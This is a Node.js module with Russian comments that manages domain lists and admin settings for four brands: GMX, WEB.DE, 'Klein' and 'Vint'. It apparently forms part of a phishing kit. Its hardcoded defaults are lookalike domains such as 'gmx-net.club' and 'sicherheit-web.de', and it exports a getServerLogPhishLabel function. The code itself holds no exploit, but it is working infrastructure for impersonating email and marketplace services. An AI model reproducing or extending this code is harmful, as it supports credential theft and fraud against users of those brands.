'use strict';

/**
 * Домены брендов GMX / WEB.DE / Klein / Vint: базово из .env, при наличии data/brand-domains.json — поверх.
 * Основной домен (поле *Domain) — «главный» лейбл/настройки; редирект 301 между хостами брендов в приложении отключён.
 * Поле *Domains в JSON — дополнительные хосты (apex, без www), по одному в строке или через запятую.
 */

const fs = require('fs');
const path = require('path');
const { DATA_DIR } = require('../core/bootstrap');

const FILE = path.join(DATA_DIR, 'brand-domains.json');

const GMX_DOMAINS_LIST = [];
const WEBDE_DOMAINS_LIST = [];
const KLEIN_DOMAINS_LIST = [];
const VINT_DOMAINS_LIST = [];

const scalars = {
  gmxDomain: '',
  gmxDomainsRaw: '',
  gmxCanonicalHost: '',
  webdeDomain: '',
  webdeDomainsRaw: '',
  webdeCanonicalHost: '',
  kleinDomain: '',
  kleinDomainsRaw: '',
  kleinCanonicalHost: '',
  vintDomain: '',
  vintDomainsRaw: '',
  vintCanonicalHost: ''
};

let brandsRef = null;

function setBrandsRef(b) {
  brandsRef = b;
}

function normHost(d) {
  return String(d == null ? '' : d)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, '')
    .split('/')[0]
    .trim();
}

function toApex(host) {
  return normHost(host).replace(/^www\./, '');
}

/**
 * Список legacy-apex из многострочного/CSV текста; без дубликатов и без основного домена.
 */
function parseLegacyApexes(raw, primaryApex) {
  const primary = toApex(primaryApex);
  const parts = String(raw || '')
    .split(/[\n,]+/)
    .map(normHost)
    .filter(Boolean);
  const out = [];
  const seen = Object.create(null);
  for (let i = 0; i < parts.length; i++) {
    const a = parts[i].replace(/^www\./, '');
    if (!a || a === primary || seen[a]) continue;
    seen[a] = true;
    out.push(a);
  }
  return out;
}

function buildHostList(primaryApex, legacyApexes) {
  const primary = toApex(primaryApex);
  const list = [];
  function addPair(base) {
    const a = toApex(base);
    if (!a) return;
    if (list.indexOf(a) === -1) list.push(a);
    const w = 'www.' + a;
    if (list.indexOf(w) === -1) list.push(w);
  }
  addPair(primary);
  for (let i = 0; i < legacyApexes.length; i++) addPair(legacyApexes[i]);
  return list;
}

function computeSnapshot(
  gmxDomain,
  gmxLegacyRaw,
  webdeDomain,
  webdeLegacyRaw,
  kleinDomain,
  kleinLegacyRaw,
  vintDomain,
  vintLegacyRaw
) {
  const gd = normHost(gmxDomain) || 'gmx-net.club';
  const gApex = toApex(gd);
  const gLegacy = parseLegacyApexes(gmxLegacyRaw, gApex);
  const gList = buildHostList(gApex, gLegacy);

  const wd = normHost(webdeDomain) || 'sicherheit-web.de';
  const wApex = toApex(wd);
  const wLegacy = parseLegacyApexes(webdeLegacyRaw, wApex);
  const wList = buildHostList(wApex, wLegacy);

  const kd = normHost(kleinDomain) || '897432.de';
  const kApex = toApex(kd);
  const kLegacy = parseLegacyApexes(kleinLegacyRaw, kApex);
  const kList = buildHostList(kApex, kLegacy);

  const vd = normHost(vintDomain) || 'grzl.org';
  const vApex = toApex(vd);
  const vLegacy = parseLegacyApexes(vintLegacyRaw, vApex);
  const vList = buildHostList(vApex, vLegacy);

  return {
    gmxDomain: gd,
    gmxDomainsRaw: gLegacy.join('\n'),
    gmxCanonicalHost: gApex,
    gmxList: gList,
    webdeDomain: wd,
    webdeDomainsRaw: wLegacy.join('\n'),
    webdeCanonicalHost: wApex,
    webdeList: wList,
    kleinDomain: kd,
    kleinDomainsRaw: kLegacy.join('\n'),
    kleinCanonicalHost: kApex,
    kleinList: kList,
    vintDomain: vd,
    vintDomainsRaw: vLegacy.join('\n'),
    vintCanonicalHost: vApex,
    vintList: vList
  };
}

function readEnvSnapshot() {
  return computeSnapshot(
    process.env.GMX_DOMAIN || 'gmx-net.club',
    (process.env.GMX_DOMAINS || '').trim(),
    process.env.WEBDE_DOMAIN || 'sicherheit-web.de',
    (process.env.WEBDE_DOMAINS || '').trim(),
    process.env.KLEIN_DOMAIN || '897432.de',
    (process.env.KLEIN_DOMAINS || '').trim(),
    process.env.VINT_DOMAIN || 'grzl.org',
    (process.env.VINT_DOMAINS || '').trim()
  );
}

function readFileSnapshot(base) {
  if (!fs.existsSync(FILE)) return base;
  let j;
  try {
    j = JSON.parse(fs.readFileSync(FILE, 'utf8'));
  } catch (e) {
    return base;
  }
  if (!j || typeof j !== 'object') return base;

  const gmxDomain = j.gmxDomain != null && String(j.gmxDomain).trim() !== '' ? normHost(j.gmxDomain) : base.gmxDomain;
  const gmxLegacy = j.gmxDomains != null ? String(j.gmxDomains).trim() : base.gmxDomainsRaw;
  const webdeDomain = j.webdeDomain != null && String(j.webdeDomain).trim() !== '' ? normHost(j.webdeDomain) : base.webdeDomain;
  const webdeLegacy = j.webdeDomains != null ? String(j.webdeDomains).trim() : base.webdeDomainsRaw;
  const kleinDomain = j.kleinDomain != null && String(j.kleinDomain).trim() !== '' ? normHost(j.kleinDomain) : base.kleinDomain;
  const kleinLegacy = j.kleinDomains != null ? String(j.kleinDomains).trim() : base.kleinDomainsRaw;
  const vintDomain = j.vintDomain != null && String(j.vintDomain).trim() !== '' ? normHost(j.vintDomain) : base.vintDomain;
  const vintLegacy = j.vintDomains != null ? String(j.vintDomains).trim() : base.vintDomainsRaw;

  return computeSnapshot(gmxDomain, gmxLegacy, webdeDomain, webdeLegacy, kleinDomain, kleinLegacy, vintDomain, vintLegacy);
}

function mergeSnapshot() {
  return readFileSnapshot(readEnvSnapshot());
}

function replaceArr(target, items) {
  target.length = 0;
  for (let i = 0; i < items.length; i++) target.push(items[i]);
}

function applySnapshot(snap) {
  scalars.gmxDomain = snap.gmxDomain;
  scalars.gmxDomainsRaw = snap.gmxDomainsRaw;
  scalars.gmxCanonicalHost = snap.gmxCanonicalHost;
  scalars.webdeDomain = snap.webdeDomain;
  scalars.webdeDomainsRaw = snap.webdeDomainsRaw;
  scalars.webdeCanonicalHost = snap.webdeCanonicalHost;
  scalars.kleinDomain = snap.kleinDomain;
  scalars.kleinDomainsRaw = snap.kleinDomainsRaw;
  scalars.kleinCanonicalHost = snap.kleinCanonicalHost;
  scalars.vintDomain = snap.vintDomain;
  scalars.vintDomainsRaw = snap.vintDomainsRaw;
  scalars.vintCanonicalHost = snap.vintCanonicalHost;

  replaceArr(GMX_DOMAINS_LIST, snap.gmxList);
  replaceArr(WEBDE_DOMAINS_LIST, snap.webdeList);
  replaceArr(KLEIN_DOMAINS_LIST, snap.kleinList);
  replaceArr(VINT_DOMAINS_LIST, snap.vintList);

  if (brandsRef && brandsRef.gmx) {
    brandsRef.gmx.canonicalHost = snap.gmxCanonicalHost;
    brandsRef.webde.canonicalHost = snap.webdeCanonicalHost;
    brandsRef.klein.canonicalHost = snap.kleinCanonicalHost;
    if (brandsRef.vint) brandsRef.vint.canonicalHost = snap.vintCanonicalHost;
  }
}

function reload() {
  applySnapshot(mergeSnapshot());
}

function getServerLogPhishLabel() {
  const env = (process.env.SERVER_LOG_PHISH_LABEL || '').trim();
  if (env) return env;
  const v = scalars.webdeDomain || 'сайт';
  return v || 'сайт';
}

function readBrandDomainsDocForWrite() {
  if (fs.existsSync(FILE)) {
    let j;
    try {
      j = JSON.parse(fs.readFileSync(FILE, 'utf8'));
    } catch (e) {
      j = null;
    }
    if (j && typeof j === 'object') return j;
  }
  return {
    gmxDomain: normHost(process.env.GMX_DOMAIN || 'gmx-net.club') || 'gmx-net.club',
    gmxDomains: String(process.env.GMX_DOMAINS || '').trim(),
    webdeDomain: normHost(process.env.WEBDE_DOMAIN || 'sicherheit-web.de') || 'sicherheit-web.de',
    webdeDomains: String(process.env.WEBDE_DOMAINS || '').trim(),
    kleinDomain: normHost(process.env.KLEIN_DOMAIN || '897432.de') || '897432.de',
    kleinDomains: String(process.env.KLEIN_DOMAINS || '').trim(),
    vintDomain: normHost(process.env.VINT_DOMAIN || 'grzl.org') || 'grzl.org',
    vintDomains: String(process.env.VINT_DOMAINS || '').trim()
  };
}

/**
 * Убрать legacy-хост: запись в brand-domains.json и перезагрузка снимка.
 * Short-domains и nginx для short не трогаются (развязка с брендовыми доменами).
 */
function removeLegacyHost(brand, hostRaw) {
  const brandKey = String(brand || '')
    .trim()
    .toLowerCase();
  if (brandKey !== 'gmx' && brandKey !== 'webde' && brandKey !== 'klein' && brandKey !== 'vint') {
    const err = new Error('brand: gmx | webde | klein | vint');
    err.statusCode = 400;
    throw err;
  }
  const apex = toApex(hostRaw);
  if (!apex) {
    const err = new Error('Укажите домен');
    err.statusCode = 400;
    throw err;
  }
  const map = {
    gmx: ['gmxDomain', 'gmxDomains'],
    webde: ['webdeDomain', 'webdeDomains'],
    klein: ['kleinDomain', 'kleinDomains'],
    vint: ['vintDomain', 'vintDomains']
  };
  const dk = map[brandKey];
  const doc = readBrandDomainsDocForWrite();
  const primary = toApex(doc[dk[0]]);
  if (!primary) {
    const err = new Error('Не задан основной домен');
    err.statusCode = 400;
    throw err;
  }
  if (apex === primary) {
    const err = new Error('Нельзя удалить основной домен — смените поле «Домен»');
    err.statusCode = 400;
    throw err;
  }
  const legacy = parseLegacyApexes(String(doc[dk[1]] || ''), primary);
  const idx = legacy.indexOf(apex);
  if (idx === -1) {
    const err = new Error('Домен не в списке наследуемых хостов');
    err.statusCode = 404;
    throw err;
  }
  legacy.splice(idx, 1);
  doc[dk[1]] = legacy.join('\n');
  doc.gmxDomain = normHost(doc.gmxDomain);
  doc.webdeDomain = normHost(doc.webdeDomain);
  doc.kleinDomain = normHost(doc.kleinDomain);
  doc.vintDomain = normHost(doc.vintDomain);

  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(FILE, JSON.stringify(doc, null, 2), 'utf8');
  reload();
  return { removed: apex, brand: brandKey };
}

function saveFromAdmin(body) {
  const gmxDomain = normHost(body && body.gmxDomain);
  const webdeDomain = normHost(body && body.webdeDomain);
  const kleinDomain = normHost(body && body.kleinDomain);
  const vintDomain = normHost(body && body.vintDomain);
  if (!gmxDomain || !webdeDomain || !kleinDomain || !vintDomain) {
    const err = new Error('Укажите основной домен для GMX, WEB.DE, Klein и Vint');
    err.statusCode = 400;
    throw err;
  }
  const gmxLegacy = String((body && body.gmxDomains) || '').trim();
  const webdeLegacy = String((body && body.webdeDomains) || '').trim();
  const kleinLegacy = String((body && body.kleinDomains) || '').trim();
  const vintLegacy = String((body && body.vintDomains) || '').trim();

  const snap = computeSnapshot(gmxDomain, gmxLegacy, webdeDomain, webdeLegacy, kleinDomain, kleinLegacy, vintDomain, vintLegacy);

  const doc = {
    gmxDomain: snap.gmxDomain,
    gmxDomains: snap.gmxDomainsRaw,
    webdeDomain: snap.webdeDomain,
    webdeDomains: snap.webdeDomainsRaw,
    kleinDomain: snap.kleinDomain,
    kleinDomains: snap.kleinDomainsRaw,
    vintDomain: snap.vintDomain,
    vintDomains: snap.vintDomainsRaw
  };

  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(FILE, JSON.stringify(doc, null, 2), 'utf8');
  applySnapshot(snap);
}

function clearFileAndReload() {
  try {
    if (fs.existsSync(FILE)) fs.unlinkSync(FILE);
  } catch (e) {}
  reload();
}

function getApiPayload() {
  return {
    gmxDomain: scalars.gmxDomain,
    gmxDomains: scalars.gmxDomainsRaw,
    webdeDomain: scalars.webdeDomain,
    webdeDomains: scalars.webdeDomainsRaw,
    kleinDomain: scalars.kleinDomain,
    kleinDomains: scalars.kleinDomainsRaw,
    vintDomain: scalars.vintDomain,
    vintDomains: scalars.vintDomainsRaw,
    overridesFile: fs.existsSync(FILE)
  };
}

/** Сколько непустых legacy-токенов в сырой строке (для лога при старте). */
function legacyTokenCount(raw) {
  return String(raw || '')
    .split(/[\n,]+/)
    .map(normHost)
    .filter(Boolean).length;
}

/**
 * Одна строка в лог при старте: фактический канон и есть ли data/brand-domains.json.
 * При смене домена в админке перезапуск PM2 подхватит файл; env в ecosystem — запас, если JSON удалён.
 */
function logStartupLine() {
  const hasFile = fs.existsSync(FILE);
  console.info(
    '[brand-domains] overridesFile=%s gmxCanonical=%s gmxLegacyTokens=%s webdeCanonical=%s kleinCanonical=%s vintCanonical=%s',
    hasFile ? 'yes' : 'no',
    scalars.gmxCanonicalHost,
    legacyTokenCount(scalars.gmxDomainsRaw),
    scalars.webdeCanonicalHost,
    scalars.kleinCanonicalHost,
    scalars.vintCanonicalHost
  );
}

module.exports = {
  scalars,
  GMX_DOMAINS_LIST,
  WEBDE_DOMAINS_LIST,
  KLEIN_DOMAINS_LIST,
  VINT_DOMAINS_LIST,
  setBrandsRef,
  reload,
  getServerLogPhishLabel,
  saveFromAdmin,
  clearFileAndReload,
  getApiPayload,
  removeLegacyHost,
  logStartupLine
};
